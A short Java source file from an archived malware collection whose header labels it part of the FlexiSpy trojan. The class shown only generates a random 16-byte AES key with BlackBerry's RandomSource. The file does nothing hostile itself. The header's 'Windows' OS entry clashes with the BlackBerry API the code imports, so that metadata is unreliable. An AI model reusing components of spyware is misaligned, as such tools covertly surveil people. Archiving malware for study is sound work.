/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.encryption;

import net.rim.device.api.crypto.RandomSource;

public class AESKeyGenerator {
	
	private static final byte lenOfAESKey = 16;
	
	public static byte[] generateAESKey() {
		byte[] aesKey = new byte[lenOfAESKey];
		RandomSource.getBytes(aesKey);
		return aesKey;
	}
}
